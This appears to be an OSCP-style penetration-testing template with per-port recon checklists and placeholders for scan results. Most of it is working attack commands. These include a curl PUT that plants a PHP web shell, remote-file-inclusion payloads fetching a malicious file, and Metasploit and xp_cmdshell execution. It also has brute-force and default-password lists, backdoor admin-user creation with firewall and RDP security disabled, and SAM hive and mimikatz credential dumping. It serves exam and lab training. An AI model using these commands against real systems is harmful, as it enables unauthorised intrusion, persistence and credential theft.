## Credit to github.com/xapax/oscp

## Info-sheet


- DNS-Domain name:
- Host name:
- OS:
- Server:
- Workgroup:
- Windows domain:
- Services and ports:

INSERTTCPSCAN

INSERTUDPSCAN

INSERTDIGSCAN

INSERTWHOISSCAN

## Recon

```
Always start with a stealthy scan to avoid closing ports.

# Syn-scan
nmap -sS INSERTIPADDRESS

# Service-version, default scripts, OS:
nmap INSERTIPADDRESS -sV -sC -O

# Scan all ports, might take a while.
nmap INSERTIPADDRESS -p-

# Scan for UDP
nmap INSERTIPADDRESS -sU
unicornscan -mU -v -I INSERTIPADDRESS

# Connect to udp if one is open
nc -u INSERTIPADDRESS 48772

# Monster scan
nmap INSERTIPADDRESS -p- -A -T4 -sC
```


### Port 21 - FTP

- Name:
- Version:
- Anonymous login:

INSERTFTPTEST

```
nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS
```

### Port 22 - SSH

- Name:
- Version:
- Protocol:
- RSA-key-fingerprint:
- Takes-password:
If you have usernames test login with username:username

INSERTSSHBANNER

INSERTSSHCONNECT


### Port 25

- Name:
- Version:
- VRFY:
- EXPN:

INSERTSMTPCONNECT

```
nc -nvv INSERTIPADDRESS 25
HELO foo<cr><lf>

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERTIPADDRESS
```

### Port 110 - Pop3

- Name:
- Version:

INSERTPOP3CONNECT

### Port 135 - MSRPC

Some versions are vulnerable.

```
nmap INSERTIPADDRESS --script=msrpc-enum
```

Exploit:

```
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

### Port 139/445 - SMB

- Name:
- Version:
- Domain/workgroup name:
- Domain-sid:
- Allows unauthenticated login:


```
nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse INSERTIPADDRESS -p 445

enum4linux -a INSERTIPADDRESS

rpcclient -U "" INSERTIPADDRESS
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

smbclient -L INSERTIPADDRESS
smbclient //INSERTIPADDRESS/tmp
smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
smbclient //INSERTIPADDRESS/ipc$ -U john
smbclient //INSERTIPADDRESS/admin$ -U john

Log in with shell:
winexe -U username //INSERTIPADDRESS "cmd.exe" --system

```

### Port 161/162 UDP - SNMP


```
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
snmp-check -t INSERTIPADDRESS -c public
```

```
# Common community strings
public
private
community
```



### Port 554 - RTSP


### Port 1030/1032/1033/1038

Used by RPC to connect in domain network. Usually nothing.

### Port 1433 - MSSQL

- Version:

```
use auxiliary/scanner/mssql/mssql_ping

# Last options. Brute force.
scanner/mssql/mssql_login

# Log in to mssql
sqsh -S INSERTIPADDRESS -U sa

# Execute commands
xp_cmdshell 'date'
go
```

If you have credentials look in metasploit for other modules.

## Port 1521 - Oracle

Name:
Version:
Password protected:

```
tnscmd10g version -h INSERTIPADDRESS
tnscmd10g status -h INSERTIPADDRESS
```


### Port 2100 - Oracle XML DB

Can be accessed through ftp.
Some default passwords here: https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm
- Name:
- Version:

Default logins:

```
sys:sys
scott:tiger
```

### Port 2049 - NFS

```
showmount -e INSERTIPADDRESS

If you find anything you can mount it like this:

mount INSERTIPADDRESS:/ /tmp/NFS
mount -t INSERTIPADDRESS:/ /tmp/NFS
```

### 3306 - MySQL

- Name:
- Version:

```
mysql --host=INSERTIPADDRESS -u root -p

nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 INSERTIPADDRESS -p 3306
```

### Port 3339 - Oracle web interface

- Basic info about web service (apache, nginx, IIS)
- Server:
- Scripting language:
- Apache Modules:
- IP-address:
- Domain-name address:

### Port 3389 - Remote desktop

Test logging in to see what OS is running

```
rdesktop -u guest -p guest INSERTIPADDRESS -g 94%

# Brute force
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS
```


### Port 80

- Server:
- Scripting language:
- Apache Modules:
- Domain-name address:

INSERTCURLHEADER


- Web application
- Name:
- Version:

```
# Nikto
nikto -h http://INSERTIPADDRESS

# Nikto with squid proxy
nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444

# Get header
curl -i INSERTIPADDRESS

# Get everything
curl -i -L INSERTIPADDRESS

# Check if it is possible to upload using put
curl -v -X OPTIONS http://INSERTIPADDRESS/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php

# Check for title and all links
dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix
```


#### Nikto scan


INSERTNIKTOSCAN



#### Url brute force



```
# Dirb
dirb http://INSERTIPADDRESS -r -o dirb-INSERTIPADDRESS.txt

# Gobuster - remove relevant responde codes (403 for example)
gobuster -u http://INSERTIPADDRESS -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
```

INSERTDIRBSCAN


#### Default/Weak login

Google documentation for default passwords and test them:

```
site:webapplication.com password
```

```
admin admin
admin password
admin <blank>
admin nameofservice
root root
root admin
root password
root nameofservice
<username if you have> password
<username if you have> admin
<username if you have> username
<username if you have> nameofservice
```

#### LFI/RFI

```
# Kadimus
/root/Tools/Kadimus/kadimus -u http://INSERTIPADDRESS/example.php?page=


# Bypass execution
http://INSERTIPADDRESS/index.php?page=php://filter/convert.base64-encode/resource=index
base64 -d savefile.php

# Bypass extension
http://INSERTIPADDRESS/page=http://192.168.1.101/maliciousfile.txt%00
http://INSERTIPADDRESS/page=http://192.168.1.101/maliciousfile.txt?
```


#### SQL-Injection

```
# Post
./sqlmap.py -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
```

#### Sql-login-bypass


- Open Burp-suite
- Make and intercept request
- Send to intruder
- Cluster attack
- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
- Attack
- Check for response length variation

### Password brute force - last resort

```
cewl
```

### Port 443 - HTTPS

Heartbleed:

```
sslscan INSERTIPADDRESS:443
```

## Vulnerability analysis

Now we have gathered information about the system. Now comes the part where we look for exploits and vulnerabilities and features.

### To try - List of possibilities
Add possible exploits here:


### Find sploits - Searchsploit and google

Where there are many exploits for a software, use google. It will automatically sort it by popularity.

```
site:exploit-db.com apache 2.4.7

# Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'
```



----------------------------------------------------------------------------



'''''''''''''''''''''''''''''''''' PRIVESC '''''''''''''''''''''''''''''''''



-----------------------------------------------------------------------------


## Privilege escalation

Now we start the whole enumeration-process over gain. This is a checklist. You need to check of every single one, in this order.

- Kernel exploits
- Cleartext password
- Reconfigure service parameters
- Inside service
- Program running as root
- Installed software
- Scheduled tasks
- Weak passwords



### To-try list
Here you will add all possible leads. What to try.


### Basic info

- OS:
- Version:
- Architecture:
- Current user:
- Hotfixes:
- Antivirus:

**Users:**

**Localgroups:**

```
systeminfo
set
hostname
net users
net user user1
net localgroups
accesschk.exe -uwcqv "Authenticated Users" *

netsh firewall show state
netsh firewall show config

# Set path
set PATH=%PATH%;C:\xampp\php
```


### Kernel exploits


```
# Look for hotfixes
systeminfo

wmic qfe get Caption,Description,HotFixID,InstalledOn

# Search for exploits
site:exploit-db.com windows XX XX
```


### Cleartext passwords

```
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```


### Reconfigure service parameters

- Unquoted service paths

Check book for instructions

- Weak service permissions

Check book for instructions

### Inside service

Check netstat to see what ports are open from outside and from inside. Look for ports only available on the inside.

```
# Meterpreter
run get_local_subnets

netstat /a
netstat -ano
```

### Programs running as root/system



### Installed software

```
# Metasploit
ps

tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

Look in:
C:\Program files
C:\Program files (x86)
Home directory of the user
```


### Scheduled tasks

```
schtasks /query /fo LIST /v

Check this file:
c:\WINDOWS\SchedLgU.Txt
```

### Weak passwords

Remote desktop

```
ncrack -vv --user george -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS
```

### Useful commands


**Add user and enable RDP**

```
net user haxxor Haxxor123 /add
net localgroup Administrators haxxor /add
net localgroup "Remote Desktop Users" haxxor /ADD

# Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

Turn firewall off
netsh firewall set opmode disable

Or like this
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

If you get this error:

"ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?
Failed to connect, CredSSP required by server.""

Add this reg key:

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```



------------------------------------------------------------------------




----------------------------- LOOT LOOT LOOT LOOT -------------------




------------------------------------------------------------------------


## Loot

- Proof:
- Network secret:
- Password and hashes:
- Dualhomed:
- Tcpdump:
- Interesting files:
- Databases:
- SSH-keys:
- Browser:

### Proof

### Network secret

### Passwords and hashes

```
wce32.exe -w
wce64.exe -w
fgdump.exe

reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

# Meterpreter
hashdump
load mimikatz
msv
```

### Dualhomed

```
ipconfig /all
route print

# What other machines have been connected
arp -a
```

### Tcpdump

```
# Meterpreter
run packetrecorder -li
run packetrecorder -i 1
```

### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql

# How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s
```

### Mail

### Browser

- Browser start-page:
- Browser-history:
- Saved passwords:

### Databases

### SSH-keys

## How to replicate:
